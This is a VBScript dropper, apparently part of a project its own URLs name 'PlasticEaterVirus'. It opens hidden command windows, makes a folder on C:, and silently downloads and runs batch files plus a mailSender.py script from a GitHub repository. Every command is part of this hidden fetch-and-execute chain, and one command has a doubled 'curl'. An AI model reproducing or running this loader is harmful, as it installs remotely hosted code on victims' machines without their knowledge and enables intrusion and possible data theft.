Dim oShell
Set oShell = WScript.CreateObject ("WScript.Shell")
oShell.run "cmd.exe /C c: & mkdir ""c:/PlasticEater""", 0
oShell.run "cmd.exe /C cd c: & c:/PlasticEater & curl https://raw.githubusercontent.com/ETML-Midicix/PlasticEaterVirus/main/Program/PlasticEater.bat -L -O -s", 0
oShell.run "cmd.exe /C cd c: & c:/PlasticEater & curl https://raw.githubusercontent.com/ETML-Midicix/PlasticEaterVirus/main/Program/rilldocker.bat -L -O -s & curl https://raw.githubusercontent.com/ETML-Midicix/PlasticEaterVirus/main/Program/readme.txt -L -O -s & curl https://raw.githubusercontent.com/ETML-Midicix/PlasticEaterVirus/main/Program/mailSender.py -L -O -s & PlasticEater.bat", 0


Dim Shell
Set Shell = WScript.CreateObject ("WScript.Shell")
Shell.run "cmd.exe /C @ECHO OFF & mode con: cols=132 lines=42 & CLS & curl curl https://raw.githubusercontent.com/ETML-Midicix/PlasticEaterVirus/main/Program/inkscape.bat & inkscape.bat", 0